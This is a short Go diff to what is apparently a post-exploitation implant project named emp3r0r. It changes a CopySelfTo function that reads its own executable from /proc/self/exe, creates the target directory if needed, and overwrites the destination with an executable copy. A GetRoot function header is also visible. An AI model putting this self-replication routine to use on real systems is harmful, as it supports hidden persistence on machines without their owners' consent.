@@ -9,6 +9,7 @@ import (
 	"log"
 	"os"
 	"os/exec"
+	"strings"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
@@ -16,18 +17,27 @@ import (
 )
 
 // Copy current executable to a new location
-func CopySelfTo(dest_path string) (err error) {
+func CopySelfTo(dest_file string) (err error) {
 	elf_data, err := ioutil.ReadFile("/proc/self/exe")
 	if err != nil {
 		return fmt.Errorf("Read self exe: %v", err)
 	}
 
-	// overwrite
-	if util.IsExist(dest_path) {
-		os.RemoveAll(dest_path)
+	// mkdir -p if directory not found
+	dest_dir := strings.Join(strings.Split(dest_file, "/")[:len(strings.Split(dest_file, "/"))-1], "/")
+	if !util.IsExist(dest_dir) {
+		err = os.MkdirAll(dest_dir, 0700)
+		if err != nil {
+			return
+		}
 	}
 
-	return ioutil.WriteFile(dest_path, elf_data, 0755)
+	// overwrite
+	if util.IsExist(dest_file) {
+		os.RemoveAll(dest_file)
+	}
+
+	return ioutil.WriteFile(dest_file, elf_data, 0755)
 }
 
 func GetRoot() error {
